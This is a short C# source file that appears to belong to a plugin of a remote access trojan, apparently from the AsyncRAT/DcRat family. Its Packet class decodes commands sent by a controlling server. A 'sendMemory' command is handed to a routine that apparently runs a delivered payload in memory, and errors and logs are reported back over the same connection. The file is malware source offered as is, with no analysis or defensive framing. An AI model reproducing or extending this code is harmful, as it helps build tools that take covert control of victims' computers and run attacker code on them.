using System;
using MessagePackLib.MessagePack;
using Plugin.Handler;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "sendMemory":
                    {
                        new HandleSendTo().ToMemory(unpack_msgpack);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}